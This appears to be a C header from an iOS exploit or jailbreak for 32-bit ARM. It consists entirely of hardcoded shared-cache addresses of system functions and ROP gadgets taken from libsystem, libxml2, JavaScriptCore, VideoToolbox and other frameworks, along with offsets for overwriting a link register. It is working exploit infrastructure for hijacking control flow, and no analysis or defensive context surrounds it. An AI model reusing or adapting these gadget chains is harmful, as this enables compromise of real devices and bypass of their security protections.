#define DEBUG

#define STRLEN_PID			3
#define STRLEN_FILENAME			66
#define LOG_SHIFT			(16 + STRLEN_PID + STRLEN_FILENAME)

#define P1				402
#define P2				619
#define P3				625
//   p2 address: 0xXXXXXX[2c]
#define P3_ADDR_LO			0x2c + (P3 - P2) * 4;
#define LR_ADDR_LO			0x30

// libsystem_kernel.dylib
#define _dsc_open			0x332cfdc4
#define _dsc_fstat                      0x332c06f4
#define _dsc_chown                      0x332c2518
#define _dsc_memcpy                     (0x332c098c + 1)
#define _dsc_munmap                     0x332cfd68
#define _dsc_unlink                     (0x332c1eb4 + 1)
#define _dsc_mkdir			0x332c2c34
#define _dsc_ftruncate			0x332c2ca0
#define _dsc_ioctl			(0x332c1bf8 + 1)
#define _dsc_close			0x332c071c
#define _dsc_ptrace			0x332d0394
#define _dsc_bsdthread_terminate	0x332cf228
#define _dsc_shm_open                   0x332c24a8
#define _dsc_mmap                       (0x332c0658 + 1)
#define _dsc_mach_task_self             (0x332ced88 + 1)
#define _dsc_mach_port_allocate         (0x332c0e44 + 1)
#define _dsc_mach_port_insert_right     (0x332c0e70 + 1)
#define _dsc_mach_msg		        (0x332c01d4 + 1)

// libsystem_c.dylib
#define _dsc_fopen			(0x35e5f004 + 1)
#define _dsc_fread			(0x35e65814 + 1)
#define _dsc_fclose			(0x35e5f65c + 1)
#define _dsc_exit			(0x35e619d0 + 1)
#define _dsc_syslog			(0x35e59ad0 + 1)
#define _dsc_sysctl			(0x35e56c64 + 1)
#define _dsc_malloc			(0x35e56184 + 1)
#define _dsc_memmem			(0x35e6fcf0 + 1)
#define _dsc_sleep			(0x35e6da54 + 1)
#define _dsc_proc_pidinfo               (0x35e5e4e0 + 1)
#define _dsc_execl                      (0x35e81cac + 1)
#define _dsc_strcpy                     0x35e5bd30
#define _dsc_sys_dcache_flush           0x35e6780c

#define LIBC_POP_R0			0x35ec6340
// __aeabi_cfcmpeq+0x10
#define LIBC_POP_R0123			0x35ec6b10
#define LIBC_POP_R47			(0x35e79f3e + 1)
#define LIBC_BLX_R4_POP_R47		(0x35e79f38 + 1)
#define LIBC_MOV_SP_R4__POP_R47		(0x35e7fcd8 + 1)
#define LIBC_STR_R0_R4__POP_R47		(0x35e9349a + 1)
#define LIBC_LDR_R0_R0__POP_R7		(0x35e594b4 + 1)
#define LIBC_SUB_R0_R4__POP_R4567	(0x35e7e246 + 1)
// pthread_mutex_lock+0x1B6
#define GADGET_MOV_SP_R4_POP8_10_11_4567   (0x35e51c82 + 1)

// libicucore.A.dylib
// uloc_toLanguageTag+0x24B2
#define GADGET_ADD_SP_120_POP8_10_4567     (0x3660ae2e + 1)

// libxml2.dylib
// xmlRegisterInputCallbacks+0x36
#define GADGET_MOV_LR_R4_MOV_R0_LR_POP47   (0x363ab01a + 1)

// liblaunch.dylib
#define _dsc_bootstrap_look_up		(0x31d27fe8 + 1)

// libdyld.dylib
#define _dsc_dlsym                      (0x358116ec + 1)

// libxpc.dylib
#define LIBC_BLX_R4_POP_R457		(0x3695c39c + 1)

// /System/Library/Frameworks/CoreData.framework/CoreData
#define GADGET_SUBS_R0_R0_R1__POP7      (0x341af748 + 1)

// /System/Library/Frameworks/AudioToolbox.framework/AudioToolbox
#define GADGET_MOV_R1_R0__POP_R47       (0x35f959cc + 1)

// /System/Library/Frameworks/AddressBook.framework/AddressBook
#define GADGET_MOV_R0_R1__POP_R47       (0x3088d26e + 1)
#define GADGET_MOV_R0_R4__POP_R47       (0x30890d5c + 1)

// /System/Library/PrivateFrameworks/JavaScriptCore.framework/JavaScriptCore
#define GADGET_MOV_R1_R4__POP_R47       (0x32f4d0e4 + 1)

// /System/Library/PrivateFrameworks/DataDetectorsCore.framework/DataDetectorsCore
#define GADGET_ADD_R0_R0_R1__POP457     0x32edfae8

// /System/Library/PrivateFrameworks/VideoToolbox.framework/VideoToolbox
// vt_Copy_420f_420v_arm+0x220
// 35982100        e28dd008        add     sp, sp, #8      @ 0x8
// 35982104        ecbd8b08        vldmia  sp!, {d8-d11}
// 35982108        ecbdcb08        vldmia  sp!, {d12-d15}
// 3598210c        e8bd0d00        pop     {r8, sl, fp}
// 35982110        e8bd80f0        pop     {r4, r5, r6, r7, pc}
#define GADGET_HOLY                        0x3696f100
